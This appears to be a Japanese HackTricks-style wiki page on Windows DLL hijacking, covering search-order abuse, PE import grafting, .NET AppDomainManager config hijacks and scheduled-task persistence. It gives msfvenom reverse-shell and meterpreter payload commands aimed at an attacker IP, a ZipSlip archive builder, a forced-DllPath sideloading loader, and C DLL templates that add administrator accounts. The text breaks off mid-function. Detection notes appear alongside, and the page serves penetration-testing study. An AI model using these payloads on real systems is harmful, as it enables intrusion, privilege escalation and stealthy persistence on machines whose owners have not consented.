# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijackingでは、信頼されたアプリケーションを操作して、悪意のあるDLLをロードさせます。この用語には、**DLL Spoofing、Injection、Side-Loading**など、いくつかの手法が含まれます。主にコード実行や永続化の実現に使われ、権限昇格に使われることは比較的まれです。ここでは権限昇格に重点を置いていますが、Hijackingの手法は目的にかかわらず同じです。

### 一般的な手法

DLL Hijackingには複数の手法があり、それぞれの有効性はアプリケーションのDLLロード方法によって異なります。<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規のDLLを悪意のあるDLLに置き換えます。必要に応じてDLL Proxyingを使い、元のDLLの機能を維持します。
2. **DLL Search Order Hijacking**: 正規のDLLよりも先に検索されるパスに悪意のあるDLLを配置し、アプリケーションの検索順序を悪用します。
3. **Phantom DLL Hijacking**: 必要なDLLが存在しないとアプリケーションに思い込ませ、ロードさせるための悪意のあるDLLを作成します。
4. **DLL Redirection**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルなどの検索パラメーターを変更し、アプリケーションを悪意のあるDLLへ誘導します。
5. **WinSxS DLL Replacement**: WinSxSディレクトリ内の正規DLLを悪意のあるDLLに置き換えます。この手法はDLL side-loadingと関連することがよくあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリへ悪意のあるDLLを配置します。Binary Proxy Executionの手法に似ています。

アプリケーションが**独自のDLL loader**を実装している場合もあります。特権プロセスが`Libraries`や`Plugins`などの子ディレクトリを列挙し、通常のWindows DLL検索順序とは別に、選択したDLLをヘルパーへ渡すことがあります。別のアカウントがその特定のディレクトリにファイルを作成できる場合は、調査の手掛かりとして扱いましょう。プロセスのID、ディレクトリに実際に適用されるACL、ファイル選択のルール、そしてロード処理に到達できるかを確認してください。実行ファイルの隣にあるディレクトリが書き込み可能でも、プロセスがそこからDLLをロードするとは限りません。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### インストール後のPE import grafting

従来のside-loadingでは、信頼されたPEを変更せずにDLL名の解決を狙います。それに対し、**Import grafting**では、信頼されたプログラムがすでにロードするPEを変更します。攻撃者は、攻撃者が制御するDLLへのimport descriptorと、関連するlookup/IATエントリーを追加します。Windowsがその依存関係を再帰的に解決すると、追加されたDLLがマッピングされ、その初期化コードが、ほかの点では正規のプロセス内で実行されます。これはディスク上のPEを変更する操作であり、実行時にIATの関数ポインターをフックに置き換える操作とは異なります。<sup>[[26]](#references)[[27]](#references)</sup>

変更するPEは、ユーザーやTask Schedulerが起動する実行ファイルではなく、中間のベンダーDLLでもかまいません。再利用可能な手順は次のとおりです。<sup>[[27]](#references)</sup>

1. 正規の実行ファイルとその依存ファイルを、攻撃者が制御するディレクトリにコピーします。
2. 依存ファイルの1つのimport構造を変更して悪意のあるDLLを参照させる一方で、その依存ファイルに期待されるexportと通常の動作を維持します。
3. autorunまたはscheduled taskを設定し、正規の実行ファイルを起動します。loaderは変更された依存ファイルをマッピングし、その後、新たにimportされたDLLをマッピングします。タスクの列挙については、[Autorunsによる権限昇格](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks)を参照してください。
4. `DllMain`では負荷の大きい処理を行わないようにします。観測されたloaderはworker threadを作成し、そこで段階的な復号を続行しました。

ベンダーのパッケージがクリーンで、インストール後にimportの変更が行われる場合、これはベンダー側のサプライチェーン侵害とは異なります。ホストEXEだけでなく、ステージングされたディレクトリ内のすべてのモジュールをトリアージしてください。依存ファイルのimportリストとハッシュを既知の正常なインストールと比較し、署名を確認し、`C:\ProgramData`のような予期しない書き込み可能な場所から起動されたベンダーバイナリを調査します。そのようなディレクトリにあるコピー済みのcrash reporterやupdaterを指すscheduled taskは、特に有用な調査の手掛かりになります。<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

従来のDLL sideloadingだけが、信頼された**.NET Framework**プロセスに攻撃者のコードをロードさせる方法ではありません。対象の実行ファイルが**managed**アプリケーションの場合、CLRは実行ファイル名に基づく**application configuration file**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタムの**AppDomainManager**を定義できます。設定ファイルが、EXEと同じディレクトリに置かれた攻撃者のassemblyを参照している場合、CLRは**アプリケーションの通常のコードパスが実行される前に**それをロードし、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoftの.NET Framework構成スキーマによると、カスタムmanagerを使用するには、`<appDomainManagerAssembly>`と`<appDomainManagerType>`の両方を指定する必要があります。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小限のマネージャー:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

実践的な注意点:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL の検索順序ではなく、CLR の設定解析に依存します。
- ホストは実際に **managed EXE** である必要があります。簡易トリアージには、`sigcheck -m target.exe`、`corflags target.exe` を実行するか、PE metadata の **CLR Runtime Header** を確認します。
- 設定ファイル名は実行ファイル名と完全に一致する必要があります（`<binary>.config`）。通常は **EXE の隣**にあります。
- 信頼された EXE は変更されないまま、悪意のある managed assembly がプロセス内で実行されるため、**署名済みの Microsoft/vendor バイナリ**で有用です。
- 書き込み可能な installer/update ディレクトリがすでにある場合、AppDomainManager hijacking を **第 1 段階**として使い、その後の段階で従来型の DLL sideloading または reflective loading を行えます。

### ダウンローダー兼 scheduled-task bootstrap としての AppDomainManager

実践的な侵入パターンでは、信頼された managed EXE と悪意のある `*.config`、さらに **小さな bootstrapper** としてのみ動作する悪意のある AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` のような信頼できそうな場所から、署名済みの .NET installer または updater を起動します。
2. 隣接する config によって、正規アプリのロジックが始まる **前に** CLR が攻撃者の assembly を読み込みます。
3. 悪意のある manager は **path gate** を実行します（例: ホスト EXE が `Downloads` から実行されている場合にのみ続行し、第 2 段階は `%LOCALAPPDATA%` からのみ実行する）。
4. チェックに通ると、ユーザーが書き込み可能な `%LOCALAPPDATA%\PerfWatson2.exe` などのパスに実際の payload をダウンロードし、scheduled task で永続化を設定します。

この手法が重要な理由:
- 署名済みホスト EXE は変更されないため、メインバイナリのハッシュしか確認しないトリアージでは侵害を見逃すことがあります。
- 単純な **パスベースの anti-analysis** はよく使われます。ZIP/EXE/DLL の 3 点セットを Desktop、Temp、または sandbox のパスに移動すると、意図的に一連の処理が壊れる場合があります。
- 第 1 段階の AppDomainManager DLL は小さく、ノイズの少ない状態を保ち、実際の implant は後から取得できます。

このパターンでよく見られる最小限の永続化の例:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

メモ:
- `/rl highest` はそのユーザー／セッションで**利用可能な最高権限**を意味し、それだけで SYSTEM への昇格が保証されるわけではありません。
- この手法は、古典的なDLLの検索順序を悪用したハイジャックというより、**.NET configの悪用による実行／永続化**に分類するのが適切な場合が多いですが、オペレーターは両方を頻繁に組み合わせます。

検出の手掛かり:
- ZIPの展開先、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動された、署名済みの.NET実行ファイルと、同じ場所にある`<exe>.config`。
- アクションの実行先が`%LOCALAPPDATA%`、`%APPDATA%`、または`Downloads`で、名前がブラウザーやベンダーのアップデーターを装っている新しいスケジュールタスク。
- 短時間で終了するマネージドブートストラッププロセスが、直ちに別のEXEをダウンロードし、その後`schtasks.exe`を起動する動作。
- 実行ファイルのパスが想定されるユーザープロファイルのディレクトリと一致しない場合に、早期終了するサンプル。

### 既存のスケジュールタスクをハイジャックしてsideloadチェーンを再起動する

永続化を調べる際は、**新しいタスクの作成**だけに注目しないでください。一部の侵入グループは、正規のインストーラーが**通常のアップデータータスク**を作成するのを待ち、その後タスクのアクションを**書き換えます**。これにより、既存の名前、作成者、トリガーが維持され、ディフェンダーには見慣れたものとして映ります。

再利用可能なワークフロー:
1. 正規のソフトウェアをインストール／実行し、通常作成されるタスクを特定します。
2. タスクXMLをエクスポートし、現在の`<Exec><Command>`／`<Arguments>`の値を記録します。<sup>[[23]](#references)</sup>
3. アクションだけを置き換え、ユーザーが書き込み可能なステージングディレクトリにある**信頼できるホストEXE**をタスクで起動するようにします。そのEXEが、実際のペイロードをサイドロードするか、AppDomain経由で読み込みます。
4. 明らかな永続化の痕跡となる新規タスクは作成せず、同じタスク名で再登録します。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

なぜよりステルス性が高いのか:
- タスク名は正当なものに見せかけられます（例: ベンダーの updater）。
- **Task Scheduler service** が起動するため、親プロセス／祖先プロセスの検証では `explorer.exe` ではなく、想定どおりのスケジューリングチェーンが確認されることがよくあります。
- **新しいタスク名**だけを探すDFIRチームは、登録済みのタスクのアクションが `%LOCALAPPDATA%`、`%APPDATA%`、または攻撃者が制御する別のパスを指すように変更されていても、見逃す可能性があります。

すばやく調査するための手掛かり:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` のXMLと、`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` のメタデータをベースラインと比較します。
- **ユーザーが書き込み可能なディレクトリ**から実行する、または同じ場所にある `*.config` ファイルを伴う .NET EXE を起動する**ベンダーの updater に見えるタスク**について、アラートを設定します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implantsをDLL sideloadingに組み合わせる手順については、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## DLLの欠落を見つける

システム内で欠落しているDllを見つける最も一般的な方法は、sysinternalsの[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**することです:

![一般的な手法 - 欠落したDllを見つける: システム内で欠落しているDllを見つける最も一般的な方法は、sysinternalsのprocmonを実行し、次の2つのフィルターを設定することです](<../../../images/image (961).png>)

![一般的な手法 - 欠落したDllを見つける: システム内で欠落しているDllを見つける最も一般的な方法は、sysinternalsのprocmonを実行し、次の2つのフィルターを設定することです](<../../../images/image (230).png>)

次に、**File System Activity**だけを表示します:

![一般的な手法 - 欠落したDllを見つける: File System Activityだけを表示する](<../../../images/image (153).png>)

**一般的に欠落しているdll**を探す場合は、これを**数秒間**実行したままにします。\
**特定の実行ファイル内で欠落しているDLL**を探す場合は、**"Process Name" "contains" `<exec name>`**のようなフィルターを追加し、その実行ファイルを実行して、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 欠落DLLの悪用

権限昇格を行うには、特権プロセスが書き込み可能な場所から読み込もうとする**DLL**を探します。正規のDLLがあるディレクトリより先に検索されるディレクトリを制御できる場合や、要求されたDLLが存在せず、検索対象ディレクトリのいずれかに書き込める場合に、この状況が発生します。

### DLLの検索順序

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)には、Dllがどのように読み込まれるかが具体的に記載されています。**

**Windowsアプリケーション**は、あらかじめ定義された一連の検索パスを特定の順序でたどり、DLLを検索します。DLL hijackingは、悪意のあるDLLをこれらのディレクトリのいずれかに配置し、正規のDLLより先に読み込ませることで発生します。これを防ぐには、アプリケーションが必要なDLLを参照する際に絶対パスを使用するようにします。

**32-bit**システムでの**DLL検索順序**は次のとおりです:

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。(_C:\Windows\System32_)
3. 16-bitシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。
   1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数に列挙されているディレクトリ。**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれないことに注意してください。DLL検索パスの計算では、**App Paths**キーは使用されません。

これは、**SafeDllSearchMode**が有効な場合の**デフォルト**の検索順序です。無効にすると、現在のディレクトリは2番目に繰り上がります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトでは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD_WITH_ALTERED_SEARCH_PATH**を指定して呼び出された場合、検索は**LoadLibraryEx**が読み込む実行可能モジュールのディレクトリから始まります。

最後に、DLLは名前ではなく絶対パスで読み込むこともできます。その場合、WindowsはDLL自体についてはそのパスだけを検索します。名前で要求された依存ファイルは、引き続き該当する検索順序に従います。

検索順序を変更する方法はほかにもありますが、ここでは説明しません。

### 任意のファイル書き込みを欠落DLL hijackにつなげる

**関連する手法:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation)。

1. **ProcMon**のフィルター（`Process Name` = 対象EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使い、プロセスがプローブしたものの見つけられなかったDLL名を収集します。<sup>[[14]](#references)</sup>
2. バイナリが**スケジュールまたはサービス経由で実行**される場合、該当する名前のDLLを**アプリケーションディレクトリ**（検索順序のエントリー #1）に配置すると、次回の実行時に読み込まれます。ある.NET scannerのケースでは、プロセスは`C:\Program Files\dotnet\fxr\...`にある本物のコピーを読み込む前に、`C:\samples\app\`内で`hostfxr.dll`を探していました。
3. 任意のexportを持つpayload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. プリミティブが**ZipSlip-style arbitrary write**の場合、展開先ディレクトリから抜け出してDLLがアプリケーションフォルダーに配置されるようなZIPを作成します:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. archiveを監視対象のinbox/shareに配置します。スケジュールされたタスクがプロセスを再起動すると、悪意のあるDLLが読み込まれ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPathによるsideloadingの強制

新しく作成するプロセスのDLL検索パスを確実に制御する高度な方法は、ntdllのネイティブAPIでプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERSのDllPathフィールドを設定することです。攻撃者が制御するディレクトリをここで指定すると、インポートされたDLLを名前で解決するターゲットプロセス（絶対パスを使用せず、安全な読み込みフラグも使用しないもの）に、そのディレクトリから悪意のあるDLLを読み込ませることができます。

主な考え方
- RtlCreateProcessParametersExを使ってプロセスパラメーターを作成し、制御下のフォルダー（例：dropper/unpackerが置かれたディレクトリ）を指すカスタムDllPathを指定します。
- RtlCreateUserProcessでプロセスを作成します。ターゲットバイナリがDLLを名前で解決すると、ローダーは解決時に指定されたDllPathを参照するため、悪意のあるDLLをターゲットEXEと同じ場所に置かなくても、確実にsideloadingできます。

注意点/制限事項
- これは作成される子プロセスに影響します。現在のプロセスだけに影響するSetDllDirectoryとは異なります。
- ターゲットはDLLを名前でインポートするか、LoadLibraryを使う必要があります（絶対パスを使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectoriesも使用しないこと）。
- KnownDLLsおよびハードコードされた絶対パスはhijackできません。Forwarded exportsやSxSによって優先順位が変わる場合があります。

最小限のCの例（ntdll、ワイド文字列、簡略化したエラー処理）:

<details>
<summary>完全なCの例：RTL_USER_PROCESS_PARAMETERS.DllPathによるDLL sideloadingの強制</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

運用上の使用例
- 必要な関数をエクスポートする、または実際の DLL に処理を転送する悪意ある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の手法を使って xmllite.dll を名前で検索することが分かっている署名済みバイナリを起動します。ローダーは指定された DllPath 経由でインポートを解決し、DLL をサイドロードします。

この手法は、実環境で多段階のサイドロードチェーンを実行するために使われた事例が確認されています。最初のランチャーがヘルパー DLL を配置し、その DLL がカスタム DllPath を指定して、乗っ取り可能な Microsoft 署名済みバイナリを起動します。これにより、ステージングディレクトリから攻撃者の DLL を強制的に読み込ませます。<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking（`.exe.config`経由）

**.NET Framework** のターゲットでは、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリを改変せずに **`Main()` より前に**サイドロードを実行できます。攻撃者は Win32 DLL の検索順序だけに頼るのではなく、正規の .NET EXE の隣に悪意ある構成ファイルと、攻撃者が制御するアセンブリを 1 つ以上配置します。

実行チェーンの仕組み:<sup>[[15]](#references)[[22]](#references)</sup>
1. ホスト EXE が起動し、**CLR が `<exe>.config` を読み込みます**。
2. 構成ファイルで **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、ランタイムに攻撃者が制御する `AppDomainManager` をインスタンス化させます。
3. 悪意あるマネージャーは、信頼されたホストプロセス内で **`Main()` より前に実行**されます。
4. 同じ構成ファイルで、CLR がローカルアセンブリ（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を優先的に解決するよう強制できます。また、インラインパッチを使わずに、ランタイムの検証やテレメトリを弱めることもできます。

キャンペーン型のパターン（正確なネスト構造はディレクティブや CLR のバージョンによって異なる場合があります）:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

有用な理由:
- **`<probing privatePath="."/>`** はアセンブリの解決先をアプリケーションディレクトリ内に保ち、そのフォルダーを予測可能なサイドローディングの攻撃面にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は、正規のアプリケーションロジックが実行される前に、CLRの初期化中に攻撃者のコードへ実行を移します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリが strong-name 検証エラーなしで、署名されていないアセンブリや改ざんされたアセンブリを読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、publisher-policy による新しいアセンブリへのリダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は、ランタイムの選択をより予測可能にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に注目すべきです。インプラントがメモリ上の `EtwEventWrite` をパッチするのではなく、設定によって **CLR 自身が ETW の可視性を無効化**します。

最近のキャンペーンで確認されている運用パターン:
- ステージ1では、`setup.exe`、`setup.exe.config`、ローカルアセンブリを配置します。
- ステージ2では、それらを信頼できそうな **AppData の更新用**フォルダーにコピーし、ホストの名前を `update.exe` のような名前に変更して、**scheduled task** 経由で再起動します。
- ステージ3では、最終的な RAT DLL/export を読み込む前に実行コンテキスト（たとえば、Task Scheduler からの想定される親プロセス `svchost.exe`）を確認します。

ハンティングのアイデア:
- ユーザーが書き込み可能な場所で、不審な隣接 **`.config`** ファイルとともに実行されている、署名済みまたはその他の正規の **.NET 実行ファイル**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリから、名前を変更した更新用バイナリを再起動する scheduled task。
- scheduled task が信頼された .NET ホストを起動し、そのホストが直ちに自身のディレクトリからベンダー製ではないアセンブリを読み込む親子プロセスの連鎖。

#### Windows のドキュメントに記載された DLL search order の例外

Windows のドキュメントには、標準 DLL search order の特定の例外が記載されています。

- **メモリにすでに読み込まれた DLL と同じ名前の DLL** が見つかった場合、システムは通常の検索を省略します。代わりに、リダイレクトとマニフェストを確認してから、メモリ内にある DLL を使用します。**この場合、システムは DLL の検索を行いません**。
- 現在の Windows バージョンで **既知の DLL** と認識される場合、システムは既知の DLL のバージョンとその依存 DLL を使用し、**検索プロセスを省略**します。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの既知の DLL の一覧が格納されています。
- **DLL に依存関係がある**場合、依存 DLL の検索は、最初の DLL がフルパスで指定されていたかどうかにかかわらず、依存 DLL が **モジュール名のみ**で指定されていた場合と同様に行われます。

### Privilege Escalation

**要件**:

- **異なる権限**で動作している、または動作するプロセス（水平移動またはラテラルムーブメント）を特定します。そのプロセスには **DLL が不足**している必要があります。
- **DLL** が検索される **ディレクトリ**のいずれかに、**書き込みアクセス**できることを確認します。この場所は、実行ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

これらの前提条件は、デフォルトではまれです。権限の高い実行ファイルに DLL の依存関係が不足していることは通常なく、標準ユーザーがシステムの検索パス内のディレクトリに書き込めることも通常ありません。ただし、設定ミスのある環境では両方の条件が満たされることがあります。\
要件を満たす場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してください。主な目的は UAC bypass ですが、特定の Windows バージョン向けの DLL-hijacking PoC が含まれており、見つけた書き込み可能なディレクトリに合わせて応用できる場合があります。

次の方法で**フォルダー内のアクセス権を確認**できます:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

また、**PATH 内のすべてのフォルダーの権限を確認してください**：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

次の方法で実行ファイルのインポートと DLL のエクスポートも確認できます:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path folder**への書き込み権限を使って**DLL Hijackingを悪用し、権限昇格する方法**の完全なガイドはこちらを確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内のフォルダに書き込み権限があるかどうかを確認します。\
この脆弱性の発見に役立つその他の自動化ツールとして、**PowerSploit functions**の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### 例

悪用可能なシナリオを見つけた場合、悪用を成功させるために最も重要なことの1つは、**実行ファイルがそのDLLからインポートするすべての関数をエクスポートするDLLを作成すること**です。なお、DLL Hijackingは、[Medium Integrity levelからHigh **（UACをバイパス）**](../../authentication-credentials-uac-and-efs/index.html#uac)、または[**High IntegrityからSYSTEM**](../index.html#from-high-integrity-to-system)**へ権限昇格するためにも便利です。**実行用のDLL Hijackingに焦点を当てたこのDLL hijacking studyでは、**有効なDLLの作成方法**の例を確認できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレート**として、または不要な関数をエクスポートする**DLLの作成**に役立つ**基本的なDLLコード**を紹介します。

## **DLLの作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy**とは、**ロード時に悪意のあるコードを実行**できる一方で、**実際のライブラリにすべての呼び出しを中継することで**、そのライブラリの関数を**公開し、期待どおりに動作**するDLLです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使うと、実行ファイルとproxy化するライブラリを指定して**proxy化されたDLLを生成**したり、DLLを指定して**proxy化されたDLLを生成**したりできます。

### **Meterpreter**

**rev shellを取得（x64）:**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86) を取得する:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**ユーザーを作成する（x86。x64版は見つかりませんでした）:**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自作

多くの場合、コンパイルする DLL は**被害プロセスがインポートするすべての関数をエクスポートする**必要があります。必要なエクスポートが欠けていると、バイナリがその関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>ユーザー作成を行うC++ DLLの例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
